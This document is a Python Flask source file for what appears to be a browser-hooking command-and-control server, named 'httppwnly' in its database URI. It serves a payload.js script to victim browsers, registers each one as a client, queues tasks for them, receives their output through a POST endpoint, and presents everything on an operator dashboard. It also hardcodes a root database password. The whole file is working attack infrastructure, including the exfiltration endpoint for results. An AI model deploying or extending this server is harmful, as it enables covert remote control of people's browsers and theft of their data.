#!/usr/bin/python
from flask import Flask, jsonify, abort, make_response, g, request
from flask.ext.cors import CORS
import sqlite3
from flask_sqlalchemy import SQLAlchemy
from collections import OrderedDict

DATABASE = 'tasks.db'
app = Flask(__name__)
cors = CORS(app)
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:P@55w0rd!@localhost/httppwnly'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

#db config


class Task(db.Model):
    id = db.Column(db.Integer, primary_key=True, autoincrement=False)
    client_id = db.Column(db.Integer, db.ForeignKey('client.id'), primary_key=True)
    input = db.Column(db.Text)
    output = db.Column(db.Text)
    
    client = db.relationship('Client',
        backref=db.backref('tasks', lazy='dynamic'))
    def __init__(self, client, id,  input, output=None):
        self.id = id
        self.client = client
        self.input = input
        self.output = output
    def __repr__(self):
        return '<Task %r>' % self.id
    def _asdict(self):
        result = OrderedDict()
        for key in self.__mapper__.c.keys():
            result[key] = getattr(self, key)
        return result

class Client(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    def __repr__(self):
        return '<Client %r>' % self.id 
    def _asdict(self):
        result = OrderedDict()
        for key in self.__mapper__.c.keys():
            result[key] = getattr(self, key)
        return result
db.drop_all()
db.create_all()
@app.route('/payload.js', methods=['GET'])
def returnJS():
    return open("payload.js").read()
    
@app.route('/api/register', methods=['GET'])
def register():
    myclient = Client()
    db.session.add(myclient)
    db.session.commit()
    print '[*] registering client: '+str(myclient.id)
    return jsonify({'clientid': myclient.id}), 201
    

@app.route('/api/tasks/<int:client_id>', methods=['GET'])
def gettasks(client_id):
    print '[*] sending tasks for client ID: '+str(client_id)
    myclient = Client.query.filter_by(id=client_id).first()
    tasklist = Task.query.filter(Task.client==myclient,Task.output.is_(None)).all()
    tasks = []
    for task in tasklist:
        tasks.append({'id':task.id,'input':task.input})
    print tasks
    return jsonify({'tasks': tasks}), 201 #replace with db eventually

@app.route('/api/client/<int:client_id>/task/<int:task_id>/output', methods=['POST'])
def recievetasks(client_id,task_id):
    if not request.json:
        abort(400)

    for task in request.json['tasks']:
        myclient = Client.query.filter_by(id=client_id).first()
        mytask = Task.query.filter_by(client=myclient,id=task_id).first()
        mytask.output=str(task['output'])
        db.session.commit()
        print '[*] recieved output for clientid: '+str(client_id)+' taskid: '+str(task_id)

    return jsonify({'result': True}), 201

@app.route('/api/tasks/add', methods=['POST'])
def addtasks():
    if not request.json:
        abort(400)
    for client in request.json['clients']:
        for task in client['tasks']:
            #do database insert for each Task
            print client['id']
            print task['task']
            
@app.route('/api/client/<int:cid>/task/add', methods=['POST']) #require auth eventually
def addtask(cid):
    if not request.json:
        abort(400)
    task = request.json['input']
    myclient = Client.query.filter_by(id=int(cid)).first()
    highesttaskid = Task.query.filter_by(client = myclient).order_by(Task.id.desc()).limit(1).all()
    #check if null, if null, taskid=1, else taskid = highesttaskid.id+1
    mytaskid=0
    if len(highesttaskid) == 0:
        mytaskid = 1
    else:
        mytaskid=highesttaskid[0].id+1
    
    mytask = Task(myclient,mytaskid,task) 
    db.session.add(mytask)
    db.session.commit()
    print '[*] Registered task id: '+str(mytask.id)

    return jsonify({'taskid': mytask.id}), 201
    #return jsonify({'taskid': 'temp'}), 201

@app.route('/api/client/<int:client_id>/task/<int:task_id>/output', methods=['GET'])
def gettaskoutput(client_id,task_id):
    myclient = Client.query.filter_by(id=int(client_id)).first()
    mytask = Task.query.filter_by(client=myclient,id=task_id).first()
    return jsonify({'output': mytask.output}), 201
     
@app.route('/api/tasks/list', methods=['GET'])
def getTaskList():
    dblist = {"clients":[]}
    clientlist = Client.query.all()
    for client in clientlist:
        client_tasks = Task.query.filter_by(client_id=int(client.id)).all()
        temparr = []
        for task in client_tasks:
            temparr.append({"realtaskid":task.id,"input":task.input,"output":task.output})
        dblist['clients'].append({"id":client.id,"tasks":temparr})
            #add task to temparr
        #add clients to list
    print dblist
    return jsonify(dblist), 201

@app.route('/api/clients/list', methods=['GET'])
def getClientList():
    iddb = []
    clientlist = Client.query.all()
    for client in clientlist:
        iddb.append(client.id)
    return jsonify({"clients":iddb}), 201 

@app.route('/api/client/<int:client_id>/tasks/poll', methods=['GET'])
def pollTasks(client_id):
    #this function basically gets a complete list of tasks for a particular client and returns taskid,true/false depending on whether output exists for it
    myclient = Client.query.filter_by(id=int(client_id)).first()
    tasks = Task.query.with_entities(Task.id,Task.input,Task.output).filter(Task.client==myclient).all()
    
    tasklist = []
    for task in tasks:
        output = False
        if task.output:
            output = True
        tasklist.append({'id':task.id,'input':task.input,'output':output})
    print tasklist
    return jsonify({'tasks': tasklist}), 201
    
@app.route('/dashboard', methods=['GET'])
def serveDash():
    return open("dashboard.html").read()
    
if __name__ == '__main__':
    app.run(debug=True,port=8081)